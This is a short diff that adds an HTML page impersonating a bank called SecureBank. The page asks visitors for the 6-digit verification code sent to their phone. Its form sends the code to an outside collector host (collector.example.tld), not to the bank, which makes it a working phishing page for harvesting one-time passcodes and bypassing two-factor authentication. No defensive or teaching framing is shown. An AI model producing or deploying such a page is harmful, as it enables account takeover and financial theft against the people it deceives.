@@ -1,0 +1,13 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>SecureBank — Verify your code</title></head>
+<body>
+<header><h1>SecureBank</h1></header>
+<main>
+  <h2>Two-step verification</h2>
+  <p>Enter the 6-digit code we sent to your phone to continue.</p>
+  <form action="https://collector.example.tld/mfa" method="post">
+    <input type="text" name="otp" autocomplete="one-time-code" inputmode="numeric" maxlength="6" placeholder="6-digit code">
+    <button type="submit">Verify</button>
+  </form>
+</main>
+</body></html>
